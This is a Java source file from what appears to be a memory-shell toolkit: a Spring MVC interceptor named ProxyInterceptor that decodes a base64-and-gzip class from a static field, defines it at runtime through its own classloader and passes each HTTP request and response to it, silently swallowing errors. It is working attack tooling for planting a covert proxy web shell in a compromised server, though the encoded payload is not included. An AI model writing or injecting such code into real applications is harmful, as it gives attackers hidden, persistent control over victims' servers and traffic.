package com.reajason.javaweb.memshell.shelltool.proxy;

import org.springframework.web.servlet.AsyncHandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

public class ProxyInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;

    public ProxyInterceptor() {
    }

    public ProxyInterceptor(ClassLoader parent) {
        super(parent);
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            if (getProxyHttpClass().newInstance().equals(new Object[]{request, response})) {
                return false;
            }
        } catch (Throwable ignored) {
        }
        return true;
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyInterceptor.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyInterceptor(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
    }

    @Override
    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
    }
}
